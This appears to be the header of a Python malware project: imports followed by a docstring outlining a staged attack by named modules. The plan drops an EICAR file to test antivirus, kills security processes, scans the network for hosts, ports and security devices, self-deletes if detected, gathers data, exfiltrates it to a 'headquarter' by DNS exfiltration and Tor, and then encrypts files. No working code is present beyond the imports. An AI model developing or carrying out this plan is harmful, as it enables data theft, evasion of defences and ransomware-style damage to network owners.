#HEAD
import psutil
import subprocess
import threading

'''
1 : from netel drop berum and retreive all dangerous process
    netel drop a EICAR and watch if it is detected and deleted or not
2 : try to kill all dangerous process
3 : rescan all process
        if process is still dangerous stop and delete all files
4 : netel drop Skana, and scan for all host on the network
        try to get all hostname, ip, mac adress, open ports with services
5 : berum analys all hostname and try to found security devices
        if security device found :
            shutdown and delete all files
6 : netel drop gortsel and argelap
7 : gortsel start to collect all interesting data and return list with path to Argelap
8 : argelap return the list to pakshel
9 : pakshel try to etablish connection with headquarter
10 : pakshel send the list to headquarter by dns exfiltration and tor
11 : pakshel send the interesting data to headquarter by dns exfiltration and tor
12 : pakshel tel to argelap he has finish
13 : argelap tel to gortsel to start the encryption and obfuscation process



'''